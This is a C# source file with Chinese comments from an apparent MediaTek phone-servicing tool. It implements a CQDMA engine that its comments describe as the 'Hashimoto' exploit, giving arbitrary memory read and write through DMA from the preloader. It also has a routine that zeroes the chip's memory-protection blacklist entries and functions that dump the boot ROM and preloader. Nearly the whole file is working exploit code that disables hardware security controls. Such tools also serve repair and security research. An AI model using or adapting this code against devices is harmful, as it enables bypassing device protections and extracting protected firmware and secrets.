using System;
using System.Collections.Generic;
using tools.Modules.MTK.Protocol;
using tools.Modules.MTK.Models;

namespace tools.Modules.MTK.Hardware
{
    /// <summary>
    /// CQDMA (Crypto Queue DMA) 控制器
    /// 用于通过 DMA 操作进行任意内存读写 (Hashimoto 漏洞利用)
    /// </summary>
    public class CqdmaEngine
    {
        private readonly PreloaderProtocol _preloader;
        private readonly ChipConfig _chipConfig;

        // CQDMA 寄存器偏移
        private const uint CQDMA_REG_INT_FLAG = 0x0;
        private const uint CQDMA_REG_INT_EN = 0x4;
        private const uint CQDMA_REG_EN = 0x8;
        private const uint CQDMA_REG_RST = 0xC;
        private const uint CQDMA_REG_STOP = 0x10;
        private const uint CQDMA_REG_FLUSH = 0x14;
        private const uint CQDMA_REG_SRC = 0x1C;
        private const uint CQDMA_REG_DST = 0x20;
        private const uint CQDMA_REG_LEN1 = 0x24;
        private const uint CQDMA_REG_LEN2 = 0x28;
        private const uint CQDMA_REG_CON = 0x2C;
        private const uint CQDMA_REG_SEC_CON = 0x40;

        // CQDMA 控制标志
        private const uint CQDMA_CON_BURST_8 = 0x0;
        private const uint CQDMA_CON_BURST_16 = 0x1;
        private const uint CQDMA_CON_WPEN = (1 << 4);
        private const uint CQDMA_CON_WPSD = (1 << 5);
        private const uint CQDMA_CON_SIZE_1B = 0x0;
        private const uint CQDMA_CON_SIZE_2B = (1 << 12);
        private const uint CQDMA_CON_SIZE_4B = (1 << 13);

        public CqdmaEngine(PreloaderProtocol preloader, ChipConfig chipConfig)
        {
            _preloader = preloader;
            _chipConfig = chipConfig;
        }

        /// <summary>
        /// CQDMA 基地址
        /// </summary>
        private uint CqdmaBase => _chipConfig.CqdmaBase ?? 0;

        /// <summary>
        /// AP DMA 内存基地址 (用于传输缓冲区)
        /// </summary>
        private uint ApDmaMem => _chipConfig.ApDmaMem ?? 0;

        /// <summary>
        /// 读取 CQDMA 寄存器
        /// </summary>
        private uint ReadReg(uint offset)
        {
            return _preloader.Read32(CqdmaBase + offset, 1);
        }

        /// <summary>
        /// 写入 CQDMA 寄存器
        /// </summary>
        private void WriteReg(uint offset, uint value)
        {
            _preloader.Write32(CqdmaBase + offset, value);
        }

        /// <summary>
        /// 初始化 CQDMA
        /// </summary>
        public void Init()
        {
            // 停止 DMA
            WriteReg(CQDMA_REG_STOP, 1);

            // 重置 DMA
            WriteReg(CQDMA_REG_RST, 1);

            // 等待重置完成
            System.Threading.Thread.Sleep(1);

            // 清除中断标志
            WriteReg(CQDMA_REG_INT_FLAG, 0);

            // 禁用中断
            WriteReg(CQDMA_REG_INT_EN, 0);
        }

        /// <summary>
        /// 等待 DMA 完成
        /// </summary>
        private void WaitDone()
        {
            int timeout = 1000;
            while (timeout-- > 0)
            {
                uint status = ReadReg(CQDMA_REG_INT_FLAG);
                if ((status & 1) != 0)
                {
                    // 清除中断标志
                    WriteReg(CQDMA_REG_INT_FLAG, 0);
                    return;
                }
                System.Threading.Thread.Sleep(1);
            }
            throw new TimeoutException("CQDMA operation timed out");
        }

        /// <summary>
        /// 使用 CQDMA 进行内存拷贝
        /// </summary>
        private void MemCopy(uint src, uint dst, uint length, bool readMode)
        {
            Init();

            // 设置源地址
            WriteReg(CQDMA_REG_SRC, src);

            // 设置目标地址
            WriteReg(CQDMA_REG_DST, dst);

            // 设置长度
            WriteReg(CQDMA_REG_LEN1, length);

            // 配置控制寄存器
            uint con = CQDMA_CON_BURST_8;
            if (length >= 4)
            {
                con |= CQDMA_CON_SIZE_4B;
            }
            else if (length >= 2)
            {
                con |= CQDMA_CON_SIZE_2B;
            }
            WriteReg(CQDMA_REG_CON, con);

            // 启动 DMA
            WriteReg(CQDMA_REG_EN, 1);

            // 等待完成
            WaitDone();
        }

        /// <summary>
        /// 读取内存
        /// </summary>
        /// <param name="address">源地址</param>
        /// <param name="length">长度</param>
        /// <param name="bypassBlacklist">是否绕过黑名单</param>
        public byte[] MemRead(uint address, uint length, bool bypassBlacklist = true)
        {
            byte[] result = new byte[length];
            uint offset = 0;

            while (offset < length)
            {
                // 每次最多传输 16 字节
                uint chunkLen = Math.Min(16, length - offset);

                // 使用 CQDMA 将数据从目标地址复制到 AP DMA 缓冲区
                MemCopy(address + offset, ApDmaMem, chunkLen, true);

                // 从 AP DMA 缓冲区读取数据 (每次读取一个 32 位值)
                for (uint i = 0; i < chunkLen; i += 4)
                {
                    uint data = _preloader.Read32(ApDmaMem + i, 1);
                    for (int j = 0; j < 4 && (i + j) < chunkLen; j++)
                    {
                        result[offset + i + (uint)j] = (byte)(data >> (j * 8));
                    }
                }

                offset += chunkLen;
            }

            return result;
        }

        /// <summary>
        /// 写入内存
        /// </summary>
        /// <param name="address">目标地址</param>
        /// <param name="data">数据</param>
        /// <param name="bypassBlacklist">是否绕过黑名单</param>
        public void MemWrite(uint address, byte[] data, bool bypassBlacklist = true)
        {
            uint offset = 0;

            while (offset < data.Length)
            {
                // 每次最多传输 16 字节
                uint chunkLen = Math.Min(16, (uint)data.Length - offset);

                // 将数据写入 AP DMA 缓冲区
                for (uint i = 0; i < chunkLen; i += 4)
                {
                    uint word = 0;
                    for (int j = 0; j < 4 && offset + i + j < data.Length; j++)
                    {
                        word |= (uint)data[offset + i + j] << (j * 8);
                    }
                    _preloader.Write32(ApDmaMem + i, word);
                }

                // 使用 CQDMA 将数据从 AP DMA 缓冲区复制到目标地址
                MemCopy(ApDmaMem, address + offset, chunkLen, false);

                offset += chunkLen;
            }
        }

        /// <summary>
        /// 读取 32 位值
        /// </summary>
        public uint Read32(uint address)
        {
            var data = MemRead(address, 4);
            return BitConverter.ToUInt32(data, 0);
        }

        /// <summary>
        /// 写入 32 位值
        /// </summary>
        public void Write32(uint address, uint value)
        {
            MemWrite(address, BitConverter.GetBytes(value));
        }

        /// <summary>
        /// 禁用内存黑名单
        /// 原理: 通过 CQDMA 直接写入黑名单控制区域，将其设为无效范围
        /// </summary>
        public void DisableRangeBlacklist(List<uint> blacklist)
        {
            if (blacklist == null || blacklist.Count == 0)
                return;

            // 对于每个黑名单入口，将起始/结束地址设为 0
            // 黑名单结构: base+0x0: 标志, base+0x4: 未知, base+0x8: 起始地址, base+0xC: 结束地址
            foreach (var blAddr in blacklist)
            {
                Write32(blAddr + 0x8, 0);
                Write32(blAddr + 0xC, 0);
            }
        }

        /// <summary>
        /// 读取 BROM (0x0 - 0x20000)
        /// </summary>
        public byte[] DumpBrom(uint length = 0x20000)
        {
            return MemRead(0, length);
        }

        /// <summary>
        /// 读取 Preloader (0x200000 - 0x240000)
        /// </summary>
        public byte[] DumpPreloader()
        {
            return MemRead(0x200000, 0x40000);
        }
    }
}
